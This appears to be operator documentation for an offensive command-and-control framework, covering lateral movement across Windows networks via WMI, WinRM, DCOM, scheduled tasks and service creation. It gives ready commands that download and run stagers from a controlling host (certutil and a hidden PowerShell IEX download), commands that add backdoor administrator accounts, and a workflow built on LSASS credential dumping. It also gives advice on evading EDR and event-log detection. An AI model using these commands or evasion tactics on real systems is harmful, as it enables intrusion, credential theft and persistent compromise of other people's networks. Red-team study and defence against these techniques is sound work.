# Lateral Movement

Move from one machine to another within a network using the current agent's network access and credentials.

---

## Overview

All lateral movement commands instruct the current agent to execute a command on a remote target machine. You need:
- **Network access** from the agent's machine to the target
- **Valid credentials** for the target (obtained via token steal, credential dump, or keylog)
- **Appropriate service enabled** on the target (WMI, WinRM, etc.)

After successful lateral movement, the command output returns to you. To get a persistent agent on the new machine, the remote command should download and execute a stager or your agent binary.

---

## WMI (Windows Management Instrumentation)

Uses `Win32_Process.Create` to execute a command on a remote machine. Works on port 135 (RPC) + dynamic high ports.

```
❯ lateral wmi a1b2 10.0.0.10 "cmd /c whoami > C:\Temp\out.txt && type C:\Temp\out.txt"
[*] Executing via WMI on 10.0.0.10...
[+] WMI command completed.

Output:
corp\administrator
```

**Agent pivot (spawn a new agent on the target):**
```
❯ lateral wmi a1b2 10.0.0.10 \
    "cmd /c certutil -urlcache -f http://192.168.1.10:8080/stage/agent.exe C:\Temp\svc.exe && C:\Temp\svc.exe"
```

**When to use:**
- WMI is enabled by default on all Windows machines
- Works with NTLM or Kerberos credentials
- Less noisy than PsExec (no service creation)
- Commonly allowed through internal firewalls

**Privilege needed:** Local administrator on the target.

**OPSEC notes:**
- WMI execution creates a process that is a child of `WMIPrvSE.exe` — this is identifiable but common
- Process creation via WMI is logged in Windows Event Log (4688 if process auditing is enabled)
- Prefer this over PsExec/service creation in environments with EDR

---

## WinRM (Windows Remote Management / PowerShell Remoting)

Executes commands via the WinRM protocol (port 5985 HTTP, 5986 HTTPS).

```
❯ lateral winrm a1b2 10.0.0.10 "Get-Process | Select-Object Name,Id | Sort-Object Name"
[*] Executing via WinRM on 10.0.0.10...
[+] WinRM command completed.

Name                   Id
----                   --
ApplicationFrameHost   3412
AppVShNotify           5892
audiodg                1584
...
```

**When to use:**
- Target has WinRM enabled (common in corporate managed environments)
- You want PowerShell remoting capabilities
- The environment uses `5985`/`5986` rather than `445`

**Privilege needed:** Member of `Remote Management Users` group, or local administrator.

**Enable check:**
```
❯ cmd a1b2 "Test-WSMan -ComputerName 10.0.0.10"
```

---

## DCOM (Distributed Component Object Model)

Abuses DCOM objects to execute code remotely via COM. Uses port 135 + dynamic RPC ports.

```
❯ lateral dcom a1b2 10.0.0.10 "powershell -e BASE64PAYLOAD"
```

**Supported DCOM objects (used internally):**
- `MMC20.Application` — most reliable, spawns under `mmc.exe`
- `ShellWindows` — uses `explorer.exe` as the spawning process
- `ShellBrowserWindow` — similar to ShellWindows

**When to use:**
- WMI and WinRM are blocked or heavily monitored
- You need the spawned process to appear under `explorer.exe` or `mmc.exe` for legitimacy
- Port 445 is blocked but 135 is open

**Privilege needed:** Local administrator on the target.

---

## Scheduled Tasks

Create a scheduled task on the remote machine, run it immediately, then delete it.

```
❯ lateral schtask a1b2 10.0.0.10 "cmd /c net user hacker P@ssword! /add"
[*] Creating scheduled task on 10.0.0.10...
[+] Task executed and cleaned up.
```

**Internally:**
1. `SchRpcRegisterTask` → create task on remote machine
2. `SchRpcRun` → execute immediately
3. Wait for completion
4. `SchRpcDelete` → remove the task

**When to use:**
- When you want execution via Task Scheduler (slightly less monitored than WMI in some environments)
- When you need to run as a specific user account (scheduled tasks can run as any user)
- When the command needs to run at a specific time

**OPSEC:** Task creation and execution is logged in the Windows Task Scheduler event log (`Microsoft-Windows-TaskScheduler/Operational`). The task is deleted after execution, but the creation/execution events remain.

---

## Service Creation (SCM)

Creates a Windows service on the remote machine, starts it (which executes your command), then deletes the service.

```
❯ lateral service a1b2 10.0.0.10 "cmd /c net localgroup administrators backdoor /add"
[*] Creating service on 10.0.0.10 via SCM...
[+] Service executed. Output received.
[*] Service cleaned up.
```

**Internally:**
1. `OpenSCManagerA(remote)` → open remote Service Control Manager
2. `CreateServiceA` → create a service with your command as `binPath`
3. `StartServiceA` → execute
4. Wait ~1500ms for execution
5. `DeleteService` → remove (always runs, even if execution fails)

**When to use:**
- Classic technique for executing as SYSTEM on a remote machine (services run as SYSTEM by default)
- When you need the command to run with the highest local privileges
- Works on port 445 (SMB) — requires open SMB

**OPSEC warning:** Service creation is extremely loud:
- Event ID 7045 (new service installed) in System event log
- Event ID 4697 (service installed) in Security log
- EDR products treat unexpected service creation as a high-confidence IoC
- Use WMI or DCOM instead when possible

---

## Choosing a Lateral Movement Method

| Method | Port | Privileges | Noise | Best When |
|--------|------|-----------|-------|-----------|
| WMI | 135 + dynamic | Local admin | Medium | General purpose, most environments |
| WinRM | 5985/5986 | Admin or Remote Mgmt Users | Low-Medium | PS Remoting enabled |
| DCOM | 135 + dynamic | Local admin | Low | EDR on WMI, need process lineage control |
| Schtask | 445 | Local admin | Medium | Time-based or user-context execution |
| Service | 445 | Local admin | High | SYSTEM context required, stealth not critical |

---

## Full Lateral Movement Workflow

```
# 1. Get credentials from current machine
❯ creds lsass a1b2
# [download dump, crack/pass hash offline]

# 2. Set up the domain admin token
❯ token make a1b2 --user administrator --domain corp --pass "CrackdHash!"

# 3. Verify network access and WMI availability
❯ netscan a1b2 -t 10.0.0.10 -p 135,445

# 4. Move laterally — download and run a stager
❯ lateral wmi a1b2 10.0.0.10 \
    "cmd /c powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.10:8080/stage')\""

# 5. Wait for new agent to check in
❯ agents list
[+] Found 2 agent(s)
 ... 
 b2c3d4e5-...  FILESERVER-02  corp\administrator  online  ...

# 6. Revert token on original agent
❯ token revert a1b2
```
